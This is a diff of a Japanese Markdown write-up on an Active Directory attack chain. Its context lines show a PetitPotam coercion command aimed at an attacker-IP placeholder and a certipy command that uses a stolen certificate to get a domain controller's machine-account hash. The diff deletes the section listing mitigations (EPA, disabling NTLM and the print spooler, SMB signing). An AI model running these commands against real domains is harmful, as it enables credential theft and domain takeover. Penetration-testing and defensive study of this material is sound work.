@@ -43,8 +43,3 @@ python3 PetitPotam.py <ATTACKER_IP> <DC_IP>
 # 取得した証明書で認証し、DC のマシンアカウントのハッシュを得る
 certipy auth -pfx dc.pfx -dc-ip <DC_IP>
 ```
-
-## 注意点
-
-- CA の HTTP 登録エンドポイントで NTLM 認証を無効化し、Kerberos 認証のみを許可するか、拡張保護（Extended Protection for Authentication, EPA）を有効にすることで緩和できる。
-- 強制認証そのものへの対策（プリンタスプーラサービスの無効化、SMB 署名の強制など）も合わせて行う必要がある。NTLM リレーの着地点を塞ぐだけでなく、強制認証の起点を減らすことが重要。
